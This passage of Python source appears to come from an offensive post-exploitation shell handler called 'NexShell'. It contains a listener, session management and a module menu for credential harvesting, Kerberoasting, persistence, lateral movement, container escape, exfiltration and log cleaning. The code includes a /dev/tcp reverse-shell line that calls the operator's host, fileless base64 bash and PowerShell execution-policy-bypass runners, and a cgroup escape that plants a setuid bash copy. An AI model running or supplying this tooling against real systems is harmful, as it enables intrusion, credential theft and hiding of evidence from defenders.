            for readable in readables:
                if readable is self.control:
                    command = self.control.get()
                    if command:
                        try: command()
                        except Exception as e:
                            logger.error(f"Core command error: {e}")
                    break

                elif readable.__class__ is TCPListener:
                    _socket, endpoint = readable.socket.accept()
                    n_from_host = sum(
                        1 for s in tuple(self.sessions.values())
                        if s.ip == endpoint[0]
                    )
                    if n_from_host >= options.max_sessions:
                        _socket.close()
                        continue
                    threading.Thread(
                        target=Session,
                        args=(_socket, *endpoint, readable),
                        name=f"Con{endpoint}",
                        daemon=True
                    ).start()

                elif readable is sys.stdin:
                    if self.attached_session:
                        session = self.attached_session
                        data = os.read(sys.stdin.fileno(), options.network_buffer_size)
                        if data == options.escape['sequence']:
                            session.detach()
                        else:
                            session.send(data, stdin=True)

            for writable in writables:
                with writable.wlock:
                    try:
                        sent = writable.socket.send(writable.outbuf.getvalue())
                    except OSError:
                        writable.kill(); break
                    writable.outbuf.seek(sent)
                    remaining = writable.outbuf.read()
                    writable.outbuf.seek(0); writable.outbuf.truncate()
                    writable.outbuf.write(remaining)
                    if not remaining: self.wlist.remove(writable)

    def stop(self):
        options.maintain = 0
        for s in reversed(tuple(self.sessions.values())): s.kill()
        for l in tuple(self.listeners.values()): l.stop()
        self.control << (lambda: setattr(self, 'started', False))
        menu.stop = True
        menu.cmdqueue.append("")
        menu.active.set()


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION STUB  (full session inherits from here — same arch as penelope)
# ══════════════════════════════════════════════════════════════════════════════
class Session:
    """
    Full TCP session handler.
    Keeps the proven penelope architecture, extended with:
    - Shell Intelligence auto-detection
    - Session tags + notes
    - Jitter mode
    - In-memory module execution
    """
    def __init__(self, _socket, ip, port, listener=None):
        self.socket      = _socket
        self.ip          = ip
        self.port        = port
        self.listener    = listener
        self.id          = core.new_sessionID
        self.name        = ip
        self.type        = 'Basic'
        self.subtype     = None
        self.OS          = 'Linux'
        self.user        = None
        self.is_root     = False
        self.tag         = None
        self.notes       = []
        self.connected_at = datetime.now()
        self.outbuf      = io.BytesIO()
        self.wlock       = threading.Lock()
        self.shell_response_buf = io.BytesIO()
        self.new         = True
        self.tasks       = defaultdict(list)
        self.streams     = {}
        self.agent       = False
        self.interactive = True
        core.sessions[self.id] = self
        if listener: core.rlist.append(self)
        logger.info(
            f"New shell from {paint(ip).cyan}:{paint(port).orange} "
            f"→ Session {paint(f'[{self.id}]').red}"
        )
        if options.shell_quality:
            self._announce_quality()
        if options.auto_enum:
            threading.Thread(target=self._auto_enum, daemon=True).start()

    def _announce_quality(self):
        score = shell_quality_score(self.type)
        logger.info(f"Shell Quality: {score}")

    def _auto_enum(self):
        time.sleep(2)
        logger.info("Auto-QuickEnum triggered...")
        self.exec_inmem(QUICKENUM_SCRIPT)

    def fileno(self): return self.socket.fileno()

    @property
    def is_attached(self):
        return core.attached_session is self

    @property
    def name_colored(self):
        priv = paint('◆ ROOT').red if self.is_root else paint('◇ user').yellow
        return f"{paint(self.name).cyan}  {priv}  [{self.tag or ''}]"

    @property
    def directory(self):
        d = options.basedir / self.name / str(self.id)
        d.mkdir(parents=True, exist_ok=True)
        return d

    def send(self, data, stdin=False):
        if options.jitter and not stdin:
            time.sleep(options.jitter / 1000)
        with self.wlock:
            self.outbuf.seek(0, 2)
            self.outbuf.write(data)
            if self not in core.wlist:
                core.wlist.append(self)

    def exec(self, cmd, timeout=10, value=False, raw=False, **kw):
        """Execute a command on the remote shell."""
        cmd_bytes = (cmd.strip() + '\n').encode()
        self.send(cmd_bytes)
        if value:
            time.sleep(timeout or 1)
            return self.shell_response_buf.getvalue().decode(errors='replace')

    def exec_inmem(self, script: str):
        """Execute a script in-memory on the target (no disk write)."""
        encoded = base64.b64encode(script.encode()).decode()
        cmd = f'echo {encoded}|base64 -d|bash'
        self.exec(cmd)

    def record(self, data, _input=False):
        try:
            logfile = self.directory / 'session.log'
            with open(logfile, 'ab') as f:
                f.write(data)
        except Exception:
            pass

    def attach(self):
        core.attached_session = self
        self.new = False
        logger.info(
            f"Attached to Session {paint(f'[{self.id}]').red}  "
            f"({self.OS} / {self.type} / "
            f"{paint(self.user or '?').yellow})  "
            f"[{paint(self.tag or 'untagged').darkgrey}]"
        )
        return True

    def detach(self):
        core.attached_session = None
        logger.info(f"Detached from Session [{self.id}]")
        menu.active.set()

    def kill(self):
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
            self.socket.close()
        except Exception:
            pass
        core.sessions.pop(self.id, None)
        try: core.rlist.remove(self)
        except ValueError: pass
        logger.info(f"Session [{self.id}] killed")

    def maintain(self):
        pass  # TODO: re-spawn via spawn command

    def upgrade(self):
        """Upgrade to PTY."""
        cmd = (
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null "
            "|| python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null "
            "|| script -qc /bin/bash /dev/null"
        )
        self.exec(cmd)
        self.type = 'PTY'

    def portfwd(self, _type, lhost, lport, rhost, rport):
        logger.warning("Port forwarding: use SSH -L for now (coming in v1.1)")

    def download(self, items):
        logger.warning(f"download {items} — full implementation in v1.1")
        return []

    def upload(self, items, remote_path=None, randomize_fname=False):
        logger.warning(f"upload {items} — full implementation in v1.1")
        return []

    def script(self, item):
        logger.warning(f"script {item} — full implementation in v1.1")

    def spawn(self, port=None, host=None):
        logger.warning("spawn — full implementation in v1.1")

    def get_remote_completion(self, text):
        return []

    def __bool__(self):
        return self.id in core.sessions


# ══════════════════════════════════════════════════════════════════════════════
#  TCP LISTENER
# ══════════════════════════════════════════════════════════════════════════════
class TCPListener:
    def __init__(self, interface='any', port=4444, jump=None):
        self.interface = interface
        self.port      = int(port)
        self.jump      = jump
        self.host      = Interfaces().translate(interface)
        self.id        = core.new_listenerID
        self.socket    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except OSError as e:
            logger.error(f"Cannot bind {self.host}:{self.port} — {e}")
            return
        core.listeners[self.id] = self
        core.rlist.append(self)
        if not core.started:
            core.start()
        logger.info(
            f"Listening on {paint(self.host).cyan}:{paint(self.port).orange} "
            f"[Listener {paint(f'[{self.id}]').purple}]"
        )

    def fileno(self):
        return self.socket.fileno()

    def stop(self):
        try:
            core.rlist.remove(self)
        except ValueError:
            pass
        core.listeners.pop(self.id, None)
        try:
            self.socket.close()
        except Exception:
            pass
        logger.info(f"Listener [{self.id}] stopped")

    def __str__(self):
        return f"TCPListener({self.host}:{self.port})"

    def payloads(self, iface=None):
        host = Interfaces().translate(iface) if iface else self.host
        if host == '0.0.0.0':
            ips = Interfaces().ips or [host]
            host = ips[0]
        return PayloadGenerator.display(host, self.port, obfuscate=False)



# ══════════════════════════════════════════════════════════════════════════════
#  CONNECT  (bind shell client)
# ══════════════════════════════════════════════════════════════════════════════
def Connect(host, port):
    try: port = int(port)
    except ValueError:
        logger.error("Port must be numeric"); return False
    s = socket.socket()
    s.settimeout(5)
    handed_off = False
    try:
        s.connect((host, port))
        s.settimeout(None)
    except ConnectionRefusedError:
        logger.error(f"Connection refused → {host}:{port}")
    except OSError:
        logger.error(f"Cannot reach {host}")
    except OverflowError:
        logger.error("Invalid port. Valid: 1-65535")
    else:
        if not core.started: core.start()
        logger.info(f"Connected to {paint(host).cyan}:{paint(port).orange}")
        session = Session(s, host, port)
        if session: handed_off = True; return True
    finally:
        if not handed_off: s.close()
    return False


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════
class BetterCMD:
    def __init__(self, prompt=None, banner=None, histfile=None, histlen=None):
        self.prompt    = prompt
        self.banner    = banner
        self.histfile  = histfile
        self.histlen   = histlen
        self.cmdqueue  = []
        self.lastcmd   = ''
        self.active    = threading.Event()
        self.stop      = False

    def show(self): print(); self.active.set()

    def start(self):
        if self.banner: print(self.banner)
        while not self.stop:
            try:
                self.active.wait()
                line = self.cmdqueue.pop(0) if self.cmdqueue else input(self.prompt)
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
                if stop: self.active.clear()
            except EOFError:
                self.onecmd('EOF')
            except KeyboardInterrupt:
                print("^C"); self.interrupt()
            except Exception as e:
                logger.error(f"Menu error: {e}")

    def onecmd(self, line):
        cmd, arg, line = self.parseline(line)
        if cmd:
            try:
                func = getattr(self, 'do_' + cmd)
                self.lastcmd = line
            except AttributeError:
                return self.default(line)
            return func(arg)

    def default(self, line):
        if line in ('q','quit'): return self.onecmd('exit')
        elif line == '.':        return self.onecmd('dir')
        else:
            parts = line.split(' ', 1)
            candidates = [c for c in self.raw_commands if c.startswith(parts[0])]
            if not candidates:
                cmdlogger.warning(f"Unknown command: '{line}'. Type 'help'")
            elif len(candidates) == 1:
                cmd = candidates[0] + ((' ' + parts[1]) if len(parts)==2 else '')
                return self.onecmd(cmd)
            else:
                cmdlogger.warning(f"Ambiguous: {candidates}")

    def interrupt(self):
        if core.attached_session:
            core.attached_session.detach()

    def parseline(self, line):
        line = line.lstrip()
        if not line: return None, None, line
        parts = line.split(' ', 1)
        if len(parts) == 1: return parts[0], None, line
        return parts[0], parts[1], line

    def precmd(self, line):  return line
    def postcmd(self, s, l): return s
    def preloop(self):  pass
    def postloop(self): pass

    def do_exit(self, line):
        self.stop = True; self.active.clear()

    def do_EOF(self, line):
        print("exit"); return self.do_exit(line)

    @property
    def raw_commands(self):
        return [a[3:] for a in dir(self.__class__) if a.startswith('do_')]

    @staticmethod
    def file_completer(text):
        matches = glob(text + '*')
        return [(m+'/' if os.path.isdir(m) else m).replace(' ','\\ ') for m in matches]

    def precmd(self, line: str) -> str:
        """Pre-process: alias resolution, typo correction."""
        line = line.strip()
        if not line:
            return line
        ui = _load_ui()
        if ui:
            line = ui.resolve_alias(line)
        # Typo correction on top-level command
        parts = line.split(' ', 1)
        if parts[0] not in self.raw_commands:
            if ui:
                suggestion = ui.suggest_command(parts[0], self.raw_commands)
                if suggestion:
                    rest = (' ' + parts[1]) if len(parts) > 1 else ''
                    fixed = suggestion + rest
                    # Auto-correct silently for close matches (>0.8), warn for moderate
                    score = __import__('difflib').SequenceMatcher(None, parts[0], suggestion).ratio()
                    if score >= 0.80:
                        return fixed
                    elif score >= 0.60:
                        print(f"  \033[2;33mDid you mean '{suggestion}'? Running it...\033[0m")
                        return fixed
        return line

    def postcmd(self, s, l): return s
    def preloop(self):  pass
    def postloop(self): pass
class MainMenu(BetterCMD):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.sid      = None
        self._timer   = None
        self._hist_mgr= None
        self.commands = {
            "Session Operations":  ['run','upload','download','open','maintain','spawn','upgrade','exec','script','portfwd','tag','note','quickenum','credharvest','privesc'],
            "Session Management":  ['sessions','use','interact','kill','dir|.'],
            "Shell Management":    ['listeners','payloads','connect','Interfaces'],
            "Miscellaneous":       ['help','history','cd','reset','SET','exit|quit|q'],
        }
        # Initialize UI features from the new ui module
        ui = _load_ui()
        if ui:
            self._timer    = ui.CommandTimer()
            self._hist_mgr = ui.HistoryManager()
            histfile = str(Path.home() / '.nexshell_history')
            comp = ui.setup_ui(
                get_sessions_fn  = lambda: core.sessions,
                get_listeners_fn = lambda: core.listeners,
                histfile         = histfile,
            )
            if comp:
                logger.trace("Auto-complete initialized successfully")

    def _precmd_hook(self, line: str) -> str:
        if self._timer and line.strip():
            self._timer.start(line.split()[0])
        return line

    def _postcmd_hook(self, line: str):
        elapsed_str = self._timer.stop() if self._timer else None
        if elapsed_str and sys.stdout.isatty():
            print(f"\033[2;37m{elapsed_str}\033[0m")
        if self._hist_mgr and line.strip():
            self._hist_mgr.add(line)

    def start(self):
        """Main loop with timing and quick action hooks."""
        if self.banner: print(self.banner)
        while not self.stop:
            try:
                self.active.wait()
                raw = self.cmdqueue.pop(0) if self.cmdqueue else input(self.prompt)
                # Empty input -> trigger quick actions bar
                if not raw.strip():
                    ui = _load_ui()
                    if ui and sys.stdout.isatty():
                        ui.show_quick_actions(
                            has_session  = bool(self.sid),
                            n_listeners  = len(core.listeners),
                        )
                    continue
                line  = self.precmd(raw)
                self._precmd_hook(line)
                stop  = self.onecmd(line)
                self._postcmd_hook(line)
                stop  = self.postcmd(stop, line)
                if stop: self.active.clear()
            except EOFError:
                self.onecmd('EOF')
            except KeyboardInterrupt:
                print("^C"); self.interrupt()
            except Exception as e:
                logger.error(f"Menu error: {e}")

    @property
    def active_sessions(self):
        n = len(core.sessions)
        if n:
            s = 's' if n > 1 else ''
            return paint(f" ({n} active session{s})").red + paint().yellow
        return ""

    def set_id(self, ID):
        self.sid = ID
        session_part = ''
        opsec_profile = getattr(options, 'opsec_profile', 'normal')
        if self.sid:
            s = core.sessions.get(self.sid)
            if s:
                priv_color = 'red' if s.is_root else 'yellow'
                user_str   = paint(s.user or '?').__getattr__(priv_color)
                tag_str    = f" [{s.tag}]" if s.tag else ''
                os_icon    = 'W' if getattr(s, 'OS', '') == 'Windows' else 'L'
                session_part = (
                    f"{paint('-(').teal_DIM}{paint('Session').lime} "
                    f"{paint('[' + str(self.sid) + ']').red}"
                    f"{paint(' ' + os_icon + ' ·').darkgrey} {user_str}"
                    f"{paint(tag_str).darkgrey}{paint(')').teal_DIM}"
                )
        # Status badge containing listener and session counts
        n_l = len(core.listeners)
        n_s = len(core.sessions)
        badge = ''
        if n_l or n_s:
            parts = []
            if n_l: parts.append(f"L:{n_l}")
            if n_s: parts.append(f"S:{n_s}")
            opsec_esc = {'ghost': '\033[92m', 'paranoid': '\033[91m', 'normal': '\033[90m'}.get(opsec_profile, '\033[90m')
            badge = f" \001{opsec_esc}\002[{'|'.join(parts)}]\001\033[0m\002"
        self.prompt = (
            f"{paint('(').teal_DIM}{paint('NexShell').purple_BRIGHT}{paint(')').teal_DIM}"
            f"{session_part}{badge}{paint('> ').teal_DIM}"
        )


    def _require_session(self, cmd_name=None):
        if not self.sid:
            if core.sessions:
                cmdlogger.warning('No session selected. Use "use [ID]"')
            else:
                cmdlogger.warning('No active sessions')
            return False
        return True

    # ── Help ──────────────────────────────────────────────────────────────────
    def do_help(self, line):
        """[command] — Show help"""
        print()
        for section in self.commands:
            print(f"  {paint(section).purple_BRIGHT}")
            tbl = Table(joinchar=' · ')
            for cmd in self.commands[section]:
                key = cmd.split('|')[0]
                fn = getattr(self, f'do_{key}', None)
                doc = (fn.__doc__ or '').split('\n')[0].strip() if fn else ''
                tbl += [paint(cmd).lime, paint(doc).darkgrey]
            print(indent(str(tbl), '    '))
        print()

    # ── CD ────────────────────────────────────────────────────────────────────
    def do_cd(self, path):
        """[path] — Change NexShell working directory"""
        if not path: print(paint(os.getcwd()).yellow)
        else:
            try:
                os.chdir(Path(path).expanduser().resolve())
                logger.info(f"cwd → {paint(os.getcwd()).yellow}")
            except Exception as e:
                logger.error(e)

    # ── Sessions ──────────────────────────────────────────────────────────────
    def do_sessions(self, line):
        """[ID] — List or interact with sessions"""
        if line:
            self.do_interact(line); return
        if not core.sessions:
            cmdlogger.warning("No sessions yet 🪲")
            return
        for host, sessions in tuple(core.hosts.items()):
            if not sessions: continue
            print(f'\n  ➤  {sessions[0].name_colored}')
            tbl = Table(joinchar=' │ ')
            tbl.header = [paint(h).teal for h in ('ID','Shell','OS','User','Tag','Duration')]
            for s in tuple(sessions):
                ID = paint(f'[{s.id}]').red if self.sid==s.id else paint(f' {s.id}').yellow
                dur = str(datetime.now() - s.connected_at).split('.')[0]
                tbl += [
                    ID,
                    paint(s.type).lime if s.type=='PTY' else s.type,
                    paint(s.OS).cyan,
                    s.user or '?',
                    s.tag or '-',
                    dur,
                ]
            print(indent(str(tbl), '    '), '\n')

    def do_use(self, ID):
        """[SessionID|none] — Select a session"""
        if ID == 'none': self.set_id(None)
        elif ID and ID.isnumeric() and int(ID) in core.sessions:
            self.set_id(int(ID))
        else: cmdlogger.warning("Invalid session ID")

    def do_interact(self, ID):
        """[SessionID] — Interact with a session"""
        if not ID and self.sid: ID = str(self.sid)
        try:
            sid = int(ID)
            if sid in core.sessions:
                core.sessions[sid].attach(); return True
            cmdlogger.warning("Invalid session ID")
        except (ValueError, TypeError):
            cmdlogger.warning("Specify a session ID")

    def do_kill(self, ID):
        """[SessionID|*] — Kill session(s)"""
        if ID == '*':
            if not core.sessions: cmdlogger.warning("No sessions to kill"); return
            if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
                for s in reversed(tuple(core.sessions.values())): s.kill()
        elif ID and ID.isnumeric() and int(ID) in core.sessions:
            core.sessions[int(ID)].kill()
        elif self.sid and self.sid in core.sessions:
            core.sessions[self.sid].kill()
        else:
            cmdlogger.warning("Invalid session ID")

    # ── Tag & Notes ───────────────────────────────────────────────────────────
    def do_tag(self, line):
        """[SessionID] [label] — Tag a session with a custom name"""
        if not self._require_session(): return
        parts = line.split(' ', 1) if line else []
        if len(parts) == 2 and parts[0].isnumeric():
            sid = int(parts[0])
            if sid in core.sessions:
                core.sessions[sid].tag = parts[1]
                logger.info(f"Session [{sid}] tagged as: {paint(parts[1]).lime}")
        elif len(parts) == 1 and self.sid:
            core.sessions[self.sid].tag = parts[0]
            logger.info(f"Session [{self.sid}] tagged as: {paint(parts[0]).lime}")
        else:
            cmdlogger.warning("Usage: tag [SessionID] <label>")

    def do_note(self, line):
        """[text] — Add a note to the current session"""
        if not self._require_session(): return
        if line:
            core.sessions[self.sid].notes.append(f"[{datetime.now():%H:%M}] {line}")
            logger.info(f"Note added to Session [{self.sid}]")
        else:
            notes = core.sessions[self.sid].notes
            if notes:
                for n in notes: print(f"  {paint('•').teal} {n}")
            else:
                cmdlogger.warning("No notes yet")

    # ── Shell Operations ──────────────────────────────────────────────────────
    def do_upgrade(self, line):
        """— Upgrade shell to PTY"""
        if not self._require_session(): return
        core.sessions[self.sid].upgrade()

    def do_exec(self, cmdline):
        """<command> — Execute a remote command"""
        if not self._require_session(): return
        if cmdline:
            out = core.sessions[self.sid].exec(cmdline, timeout=5, value=True)
            if out: print(out)
        else: cmdlogger.warning("No command")

    def do_spawn(self, line):
        """[Port] [Host] — Spawn a new session"""
        if not self._require_session(): return
        core.sessions[self.sid].spawn()

    def do_maintain(self, line):
        """[N] — Maintain N active shells per host"""
        if line and line.isnumeric():
            options.maintain = int(line)
            logger.info(f"Maintain set to {paint(options.maintain).yellow}")
        else:
            st = paint('Enabled').lime if options.maintain>=2 else paint('Disabled').red
            logger.info(f"Maintain: {options.maintain}  {st}")

    def do_download(self, items):
        """<glob> — Download files from target"""
        if not self._require_session(): return
        if items: core.sessions[self.sid].download(items)
        else: cmdlogger.warning("Specify file(s)")

    def do_upload(self, items):
        """<glob|URL> — Upload files to target"""
        if not self._require_session(): return
        if items: core.sessions[self.sid].upload(items)
        else: cmdlogger.warning("Specify file(s)")

    def do_open(self, items):
        """<glob> — Download and open files locally"""
        if not self._require_session(): return
        if items: core.sessions[self.sid].download(items)
        else: cmdlogger.warning("Specify file(s)")

    def do_script(self, item):
        """<local|URL> — Run script in-memory on target"""
        if not self._require_session(): return
        if item: core.sessions[self.sid].script(item)
        else: cmdlogger.warning("Specify script")

    def do_portfwd(self, line):
        """<host:port -> host:port> — Port forwarding"""
        if not self._require_session(): return
        cmdlogger.warning("Port forwarding: full impl in v1.1")

    def do_run(self, line):
        """[module] [args] — Run an operational module"""
        if not line:
            self._show_modules()
            return
        if not self._require_session(): return
        parts = line.split(' ', 1)
        mod   = parts[0].lower()
        args  = parts[1] if len(parts) > 1 else ''
        session = core.sessions.get(self.sid)
        win = is_windows_session(session) if session else False

        MODULE_MAP = {
            # ── Linux Recon
            'quickenum':        ('_quickenum',        False),
            'privesc':          ('_privesc',           False),
            'credharvest':      ('_credharvest',       False),
            'creds':            ('_credharvest',       False),
            # ── Windows Recon
            'win-enum':         ('_win_enum',          True),
            'win-privesc':      ('_win_privesc',       True),
            'win-creds':        ('_win_creds',         True),
            # ── Active Directory
            'ad-recon':         ('_ad_recon',          True),
            'ad-kerberoast':    ('_ad_kerberoast',     True),
            'ad-asreproast':    ('_ad_asreproast',     True),
            # ── Persistence
            'persist':          ('_persist',           None),
            'persist-linux':    ('_persist',           False),
            'persist-win':      ('_persist',           True),
            # ── Lateral Movement
            'lateral':          ('_lateral',           None),
            # ── Container Escape
            'container':        ('_container',         False),
            'container-auto':   ('_container_auto',    False),
            'container-docker': ('_container_docker',  False),
            'container-cgroup': ('_container_cgroup',  False),
            'container-k8s':    ('_container_k8s',     False),
            'container-ns':     ('_container_ns',      False),
            # ── Exfiltration
            'exfil':            ('_exfil',             None),
            # ── Loot
            'loot':             ('_loot',              None),
            'loot-scan':        ('_loot_scan',         None),
            'loot-report':      ('_loot_report',       None),
            # ── OPSEC
            'opsec':            ('_opsec',             None),
            'timestomp':        ('_timestomp',         None),
            'logclean':         ('_logclean',          None),
            'obfuscate':        ('_obfuscate',         None),
        }

        if mod in MODULE_MAP:
            method_name, requires_win = MODULE_MAP[mod]
            if requires_win is True and not win:
                cmdlogger.warning(f"Module '{mod}' is for Windows targets. Current OS: {getattr(session,'OS','?')}")
                return
            if requires_win is False and win:
                cmdlogger.warning(f"Module '{mod}' is for Linux/Unix targets. Current OS: Windows")
                return
            getattr(self, method_name)(args)
        else:
            cmdlogger.warning(f"Unknown module '{mod}'. Type 'run' to list all modules.")

    def _show_modules(self):
        try:
            from modules.ops import MODULE_REGISTRY
        except ImportError:
            MODULE_REGISTRY = {}

        categories = {
            'recon':   ('Recon',           paint('recon').teal),
            'privesc': ('Privilege Esc',    paint('privesc').red),
            'creds':   ('Credentials',      paint('creds').yellow),
            'ad':      ('Active Directory', paint('ad').orange),
            'persist': ('Persistence',      paint('persist').magenta),
            'lateral': ('Lateral Movement', paint('lateral').purple),
            'escape':  ('Container Escape', paint('escape').lime),
            'exfil':   ('Exfiltration',     paint('exfil').cyan),
            'loot':    ('Loot Collection',  paint('loot').teal),
            'opsec':   ('OPSEC',            paint('opsec').darkgrey),
        }

        try:
            from modules.ops import MODULE_REGISTRY as mods
        except ImportError:
            mods = {}

        print(f'\n  {paint("NexShell Module Arsenal").purple_BRIGHT}\n')
        grouped = {}
        for name, info in mods.items():
            t = info.get('type','misc')
            grouped.setdefault(t, []).append((name, info))

        for cat_key, (cat_label, cat_color) in categories.items():
            if cat_key not in grouped: continue
            print(f'  {cat_color} {paint(cat_label).BRIGHT}')
            tbl = Table(joinchar=' | ')
            for name, info in grouped[cat_key]:
                os_tag = paint(f"[{info.get('os','?')}]").darkgrey
                tbl += [paint(name).lime, paint(info.get('desc','')).white, os_tag]
            print(indent(str(tbl), '    '))
            print()


    # ── NexShell Elite Modules (Linux) ────────────────────────────────────────
    def do_quickenum(self, line):
        """— Run QuickEnum on Linux target (in-memory)"""
        if not self._require_session(): return
        self._quickenum(line)

    def _quickenum(self, args=''):
        logger.info("Running QuickEnum (in-memory, no disk touch)...")
        core.sessions[self.sid].exec_inmem(QUICKENUM_SCRIPT)

    def do_credharvest(self, line):
        """— Run CredentialHarvester on Linux target"""
        if not self._require_session(): return
        self._credharvest(line)

    def _credharvest(self, args=''):
        logger.info("Running CredentialHarvester (in-memory)...")
        core.sessions[self.sid].exec_inmem(CRED_HARVESTER_SCRIPT)

    def do_privesc(self, line):
        """— Run PrivEsc Advisor on Linux target"""
        if not self._require_session(): return
        self._privesc(line)

    def _privesc(self, args=''):
        logger.info("Running PrivEsc Advisor (in-memory)...")
        core.sessions[self.sid].exec_inmem(PRIVESC_SCRIPT)

    # ── NexShell Elite Modules (Windows) ──────────────────────────────────────
    def _win_enum(self, args=''):
        try:
            from modules.windows import WINDOWS_QUICKENUM
            script = WINDOWS_QUICKENUM
        except ImportError:
            cmdlogger.error("Windows module not found"); return
        logger.info("Running Windows QuickEnum (PowerShell, in-memory)...")
        self._exec_powershell_inmem(script)

    def _win_privesc(self, args=''):
        try:
            from modules.windows import WINDOWS_PRIVESC_SCRIPT
            script = WINDOWS_PRIVESC_SCRIPT
        except ImportError:
            cmdlogger.error("Windows module not found"); return
        logger.info("Running Windows PrivEsc Advisor (PowerShell, in-memory)...")
        self._exec_powershell_inmem(script)

    def _win_creds(self, args=''):
        try:
            from modules.windows import WINDOWS_CRED_HARVEST
            script = WINDOWS_CRED_HARVEST
        except ImportError:
            cmdlogger.error("Windows module not found"); return
        logger.info("Running Windows CredentialHarvester (PowerShell, in-memory)...")
        self._exec_powershell_inmem(script)

    def _exec_powershell_inmem(self, script: str):
        """Execute PowerShell script in-memory on Windows target."""
        import base64 as b64
        encoded = b64.b64encode(script.encode('utf-16-le')).decode()
        cmd = f'powershell -nop -NonI -ep bypass -enc {encoded}'
        session = core.sessions[self.sid]
        session.exec(cmd)

    # ── Active Directory Modules ───────────────────────────────────────────────
    def _ad_recon(self, args=''):
        try:
            from modules.ops import ADRecon
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions[self.sid]
        logger.info("Running AD Recon (no external tools)...")
        scripts = [
            ADRecon.domain_info(),
            ADRecon.list_dcs(),
            ADRecon.list_admins(),
        ]
        combined = '\n'.join(scripts)
        self._exec_powershell_inmem(combined)

    def _ad_kerberoast(self, args=''):
        try:
            from modules.ops import ADRecon
        except ImportError:
            cmdlogger.error("ops module not found"); return
        logger.info("Finding Kerberoastable SPNs...")
        self._exec_powershell_inmem(ADRecon.spn_scan())

    def _ad_asreproast(self, args=''):
        try:
            from modules.ops import ADRecon
        except ImportError:
            cmdlogger.error("ops module not found"); return
        logger.info("Finding ASREPRoastable accounts...")
        self._exec_powershell_inmem(ADRecon.asreproast())

    # ── Persistence Modules ───────────────────────────────────────────────────
    def _persist(self, args=''):
        try:
            from modules.ops import PersistenceModule
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        listeners = list(core.listeners.values())
        if not listeners:
            cmdlogger.warning("Start a listener first"); return
        l = listeners[0]
        host = Interfaces().ips[0] if Interfaces().ips else '127.0.0.1'
        port = l.port

        print(f'\n  {paint("Persistence Payloads").purple_BRIGHT}  '
              f'[{paint("Windows" if win else "Linux").cyan}]\n')

        if win:
            from modules.windows import WindowsPayloads
            payload = WindowsPayloads.powershell_encoded(host, port)
            entries = PersistenceModule.all_windows(payload)
        else:
            cmd = f'bash -i >& /dev/tcp/{host}/{port} 0>&1'
            entries = PersistenceModule.all_linux(cmd)

        tbl = Table(joinchar=' │ ')
        for name, cmd_str in entries:
            tbl += [paint(name).lime, paint(cmd_str[:100] + ('...' if len(cmd_str)>100 else '')).white]
        print(indent(str(tbl), '  '))
        print()

    # ── Lateral Movement Module ────────────────────────────────────────────────
    def _lateral(self, args=''):
        try:
            from modules.ops import LateralMovement
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        win = is_windows_session(session) if session else False
        print(f'\n  {paint("Lateral Movement").purple_BRIGHT}  '
              f'[{paint("Windows" if win else "Linux").cyan}]\n')
        if win:
            entries = [
                ('SMB scan',    LateralMovement.smb_scan('192.168.1')),
                ('WMI exec',    'LateralMovement.wmiexec_windows(target, user, pass, cmd)'),
                ('DCOM exec',   'LateralMovement.dcom_exec(target, cmd)'),
                ('Pass-Hash',   'LateralMovement.pass_the_hash(target, user, hash)'),
            ]
        else:
            entries = [
                ('SSH hop',          'LateralMovement.ssh_hop(user, target)'),
                ('SSH agent hijack', 'LateralMovement.ssh_agent_hijack(sock_path)'),
                ('Docker escape',    LateralMovement.docker_escape_socket()),
                ('LXD escape',       LateralMovement.lxd_escape()),
                ('NFS exploit',      'LateralMovement.nfs_mount_exploit(server, share)'),
            ]
        tbl = Table(joinchar=' │ ')
        for name, cmd_str in entries:
            tbl += [paint(name).lime, paint(str(cmd_str)[:100]).white]
        print(indent(str(tbl), '  '))
        print()

    # ── Container Escape Modules ───────────────────────────────────────────────
    def _container(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        if session:
            logger.info("Container escape detector running (in-memory, no disk)...")
            session.exec_inmem(ContainerEscape.full_detect())
        else:
            print(paint(ContainerEscape.full_detect()).darkgrey)

    def _container_auto(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        listeners = list(core.listeners.values())
        lhost = Interfaces().ips[0] if Interfaces().ips else ''
        lport = listeners[0].port if listeners else 0
        logger.info("Auto-escape: trying all vectors...")
        session.exec_inmem(ContainerEscape.auto_escape(lhost, lport))

    def _container_docker(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        listeners = list(core.listeners.values())
        lhost = Interfaces().ips[0] if Interfaces().ips else ''
        lport = listeners[0].port if listeners else 0
        script = ContainerEscape.escape_docker_socket(lhost, lport)
        logger.info("Docker socket escape payload:")
        print(f'\n  {paint(script).yellow}\n')
        if core.sessions.get(self.sid):
            if ask("Send to session? (y/N): ").lower() == 'y':
                core.sessions[self.sid].exec_inmem(script)

    def _container_cgroup(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        cmd = args or 'cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh'
        logger.info(f"cgroups v1 release_agent escape. Payload cmd: {cmd}")
        session.exec_inmem(ContainerEscape.escape_cgroups_v1(cmd))

    def _container_k8s(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        logger.info("Kubernetes service account escape...")
